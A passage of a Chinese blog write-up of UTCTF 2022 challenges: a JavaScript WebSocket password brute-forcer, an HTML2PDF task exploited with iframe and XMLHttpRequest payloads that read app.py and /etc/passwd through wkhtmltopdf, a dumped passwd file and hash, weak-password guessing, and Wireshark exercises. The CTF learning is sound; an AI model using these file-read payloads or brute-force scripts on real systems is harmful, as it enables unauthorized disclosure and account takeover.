class="line">                    <span class="keyword">if</span> (isOk)&#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;bad pass!&quot;</span>)  <span class="comment">//抛出试探失败的err</span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err);  <span class="comment">//通知试探失败</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">resolve</span>();  <span class="comment">//这里一定一定要加括号，这样才是函数调用，否则只是参数</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        ws.<span class="property">onclose</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connection closed.&#x27;</span>);  <span class="comment">//通知连接断开</span></span><br><span class="line">            <span class="title function_">resolve</span>();  <span class="comment">//不加括号会出现resolve无效的情况，程序会卡住</span></span><br><span class="line">          &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> isOk  <span class="comment">//返回标记</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main_logic</span>(<span class="params">beg,end</span>)&#123;  <span class="comment">//输入密码爆破的范围</span></span><br><span class="line">    <span class="keyword">var</span> running=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">var</span> num=beg;</span><br><span class="line">    <span class="keyword">while</span>(running &amp;&amp; num&lt;=end)&#123;  <span class="comment">//爆破密码</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;following: &quot;</span>+num)  <span class="comment">//通知本次试探的num</span></span><br><span class="line">        running = <span class="keyword">await</span> <span class="title function_">websoc</span>(num)  <span class="comment">//试探num</span></span><br><span class="line">        num+=<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num&lt;=end) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;success!&quot;</span>)  <span class="comment">//通知爆破结果</span></span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;failed!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>JavaScript下websocket的异步处理思路:</p>
+<p>websocket的连接建立并返回”badpass”后若不继续传输数据，则会产生以下报错并断开连接:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VWebSocket connection to &#x27;ws://web1.utctf.live:8651/internal/ws&#x27; failed: Invalid frame header</span><br></pre></td></tr></table></figure></div>
+
+<p>若继续传输无效数据则会返回”error”并正常断开连接</p>
+<p>将<code>onopen</code> <code>onmessage</code> <code>onclose</code>函数分别包裹进<code>promise</code>中，当条件达成时再结束本次<code>promise</code>以达到异步处理的效果，试探失败就等待连接断开后重新建立连接</p>
+<hr>
+<p>总结:本题涉及”websocket”协议，需了解后摸清连接规则，编写脚本爆破密码</p>
+<p>参考:[</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/wangzhanzheng/article/details/78603532" >es6使用websocket同步等待方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket" >WebSocket MDN文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zh.javascript.info/async" >JavaScript教程-Promise,async&#x2F;await <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>,</p>
+<p><a href="">NKK的的py脚本</a>,</p>
+<p>]</p>
+<h3 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h3><p><em>一个html转pdf的渲染器</em></p>
+<p>由于可以借助<code>&lt;iframe src=&quot;&quot;&gt;</code>访问其他网址，故此处存在ssrf漏洞。具体操作不明，放两个奇怪的代码块用于渲染:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">* &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">95%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:document.write(navigator.userAgent);&quot;</span>&gt;</span> //没看懂引号中的语法= =</span><br><span class="line">//  远端是wkhtmltopdf 9.0,此处测试ssrf的可能性</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180625659-1442162436.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/* app根目录在/usr/src/app，上传上去的html在/usr/src/app/随机数字.htm,上传的文件不会删除 | 来自二师傅的结论 */</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">* &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">98%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;file:///usr/src/app/app.py&quot;</span>&gt;</span>  //获取app源码，怎么摸清源码位置的？</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *         <span class="comment">#源码</span></span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> spwd</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hmac <span class="keyword">import</span> compare_digest <span class="keyword">as</span> compare_hash</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)  </span><span class="comment">##连接路劲，方法为POST或者GET</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  	<span class="comment">##主页</span></span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:   <span class="comment">##POST方法</span></span><br><span class="line">		html_content = request.form.get(<span class="string">&#x27;content&#x27;</span>)   <span class="comment">##由表单GET方法得到的content内容</span></span><br><span class="line">		<span class="keyword">if</span> html_content <span class="keyword">is</span> <span class="literal">None</span>: 		<span class="comment">##content为空</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)	</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;/environ&#x27;</span> <span class="keyword">in</span> html_content:  <span class="comment">##含有/environ路径</span></span><br><span class="line">			<span class="comment"># Don&#x27;t let them read the flag from /proc/&lt;pid&gt;/environ</span></span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;Aren&#x27;</span><span class="string">&#x27;t you sneaky? That&#x27;</span><span class="string">&#x27;s a good idea, but not the intended solution, so keep trying :)&#x27;</span>  <span class="comment">##不给你看</span></span><br><span class="line">		<span class="comment"># Filenames.</span></span><br><span class="line">		html = render_template(<span class="string">&#x27;document.html&#x27;</span>, content=html_content)  <span class="comment">##读取数据?</span></span><br><span class="line">		uid = <span class="built_in">str</span>(<span class="built_in">hash</span>(time.time())) <span class="comment"># Using a hash of the time ensures unique filenames between requests.</span></span><br><span class="line">		out_filename = uid+<span class="string">&#x27;.pdf&#x27;</span>  <span class="comment">##uid取哈希为随机数</span></span><br><span class="line">		html_filename = uid+<span class="string">&#x27;.html&#x27;</span></span><br><span class="line">		html_file = <span class="built_in">open</span>(html_filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">		html_file.write(html)  <span class="comment">##用html渲染?</span></span><br><span class="line">		html_file.close()  </span><br><span class="line"></span><br><span class="line">        <span class="comment"># Generate PDF.</span></span><br><span class="line">		TIMEOUT = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">		subprocess.run([<span class="string">&#x27;xvfb-run&#x27;</span>, <span class="string">&#x27;timeout&#x27;</span>, <span class="string">&#x27;--preserve-status&#x27;</span>, <span class="string">&#x27;-k&#x27;</span>, TIMEOUT, TIMEOUT,</span><br><span class="line"><span class="string">&#x27;wkhtmltopdf&#x27;</span>,<span class="string">&#x27;--enable-local-file-access&#x27;</span>, html_filename, out_filename])</span><br><span class="line">			<span class="comment">##后台利用wkhtmltopdf渲染pdf</span></span><br><span class="line">        <span class="comment"># Cleanup and return result.</span></span><br><span class="line">		out_file = <span class="built_in">open</span>(out_filename, <span class="string">&#x27;rb&#x27;</span>)  </span><br><span class="line">		output = out_file.read()</span><br><span class="line">		out_file.close()</span><br><span class="line">		<span class="comment">#os.remove(out_filename)</span></span><br><span class="line">		<span class="comment">#os.remove(html_filename)</span></span><br><span class="line">		response = make_response(output)  <span class="comment">##创建响应</span></span><br><span class="line">		response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/pdf&#x27;</span>  <span class="comment">##创建响应头</span></span><br><span class="line">		response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;inline; filename=document.pdf&#x27;</span></span><br><span class="line">		<span class="keyword">return</span> response</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  <span class="comment">##渲染后返回pdf页面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)  </span><span class="comment">##登录页面在&quot;/admin&quot;下</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adminLogin</span>():  <span class="comment">##登录规则</span></span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">		username = request.form.get(<span class="string">&#x27;username&#x27;</span>)		<span class="comment">##读取用户名密码</span></span><br><span class="line">		password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> username <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> password <span class="keyword">is</span> <span class="literal">None</span>:	<span class="comment">##若为空</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Check that username and password match a user in the system.</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			pw1 = spwd.getspnam(username).sp_pwd  <span class="comment">##从密码库中取用户名对应的密码</span></span><br><span class="line">			pw2 = crypt.crypt(password, pw1)		<span class="comment">##利用真密码对输入密码二次加密?</span></span><br><span class="line">			<span class="keyword">if</span> compare_hash(pw2, pw1):  <span class="comment">##取哈希并比较</span></span><br><span class="line">				<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=os.environ[<span class="string">&#x27;FLAG&#x27;</span>])  <span class="comment">##通过比较返回flag</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect password!&#x27;</span>)</span><br><span class="line">		<span class="keyword">except</span> KeyError:</span><br><span class="line">			<span class="comment"># No such username.</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=<span class="string">&#x27;Incorrect username!&#x27;</span>)</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>源码中可以看到我们可以访问”&#x2F;admin”进入登录界面，登陆成功即可得到flag，可是具体怎么登陆没看懂&#x3D; &#x3D;</p>
+<hr>
+<p>借助<code>file:///$&#123;path&#125;.//.$&#123;filename&#125;</code>协议访问本地的文件</p>
+<p>file协议对应有一个类似http的远程访问，就是ftp协议，即文件传输协议</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">* &#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">height</span>: <span class="number">98%</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css"><span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">/*</span><br><span class="line">密码hash</span><br><span class="line">$1$Rj9G/TPc$e5k/QAhlagK6pxGyfQNJ5.</span><br><span class="line">spwd库要root才能用，root有权限读/etc/shadow</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>
+
+<p><code>javascript:document.write(navigator.userAgent)</code>:往文件写入浏览器http请求头信息(标记为javascript语言)，接上方语法</p>
+<hr>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">document.write(window.location)</span>&gt;</span> <span class="comment">&lt;!-- 不知道xml的相关语法 --&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>该语句通过XML语句成功读取本地执行目录</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- xml语法919 --&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>该语句通过xml语句，让后台执行读取本地”&#x2F;passwd”文件内容，并发出数据，接收到数据后再写入我们传入的文件中，最后显示出来。即这是后台自己读取发给我们的，而不是我们申请读取”passwd”内容的（若是直接尝试读取passwd会因为权限不足而失败）</p>
+<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:wwwdata:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List</span><br><span class="line">Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting</span><br><span class="line">System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network</span><br><span class="line">Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:102:103:systemd</span><br><span class="line">Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin messagebus:x:103:105::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi:x:104:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">geoclue:x:105:108::/var/lib/geoclue:/usr/sbin/nologin dave:x:1000:1000::/home/dave:/bin/bash</span><br><span class="line">john:x:1001:1001::/home/john:/bin/bash emma:x:1002:1002::/home/emma:/bin/bash</span><br><span class="line">WeakPasswordAdmin:x:1003:1003::/home/WeakPasswordAdmin:/bin/bash</span><br></pre></td></tr></table></figure></div>
+
+<p>好像这里的都是有效用户，留意到最后一项为”WeakPasswordadmin”弱密码用户，可以以此为用户名并直接爆破出弱密码为”sunshine”，从而登录得到flag!</p>
+<hr>
+<p>总结:本题涉及知识点有<strong>SSRF漏洞利用</strong>，<strong>代码审计(python)<strong>，</strong>弱密码爆破</strong>。其中SSRF漏洞需要一定的HTML的绕过知识</p>
+<p><strong>参考：[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf" >PDF解析器html&#x2F;XSS 实现SSRF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/SouthWind0/article/details/83589759" >wkhtmltopdf漏洞 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.yesck.com/post/top1000-password/" >全国弱口令TOP1000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h2 id="Beginner"><a href="#Beginner" class="headerlink" title="Beginner"></a>Beginner</h2><h3 id="BabyShark"><a href="#BabyShark" class="headerlink" title="BabyShark"></a>BabyShark</h3><p>提示HTTP中有信息</p>
+<p>用wireshark打开后发现两条HTTP流，第一条提示曾用GET方法请求过”flag.png”文件，第二条流是一个PNG文件的传输流，猜测为flag图像，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180704160-269933016.png"
+                     
+                ></p>
+<p><strong>右键PNG栏目(Portable Network Graphics)，导出分组字节流并保存为”flag.png”</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180721418-1643278113.png"
+                     
+                ></p>
+<p><strong>得到flag</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180739429-825543176.png"
+                     
+                ></p>
+<h3 id="BabyShark2"><a href="#BabyShark2" class="headerlink" title="BabyShark2"></a>BabyShark2</h3><p>这个更简单，提示ftp流有信息，过滤栏输入”ftp”提取ftp信息发现有很多，观察信息直接找到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202203/2724756-20220325180758874-305458105.png"
+                     
+                ></p>
+<p><strong>WP参考:</strong><a class="link"   target="_blank" rel="noopener" href="https://github.com/csn3rd/UTCTFWriteups" >csn3rd <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<!-- flag of hidden posts -->
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> CTF比赛复盘（一）</li>
+        <li><strong>Author:</strong> Forestsetyou</li>
+        <li><strong>Created at
+                :</strong> 2022-03-25 18:09:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-09-23 13:47:00
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://forestsetyou.github.io/2022/03/25/Security/CTF/CTF比赛复盘（一）/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">CTF比赛复盘（一）</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#D-3CTF"><span class="nav-text">D^3CTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#d3oj"><span class="nav-text">d3oj</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shorter"><span class="nav-text">shorter</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UTCTF"><span class="nav-text">UTCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB-1"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Websockets"><span class="nav-text">Websockets?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML2PDF"><span class="nav-text">HTML2PDF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Beginner"><span class="nav-text">Beginner</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyShark"><span class="nav-text">BabyShark</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BabyShark2"><span class="nav-text">BabyShark2</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Forestsetyou</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
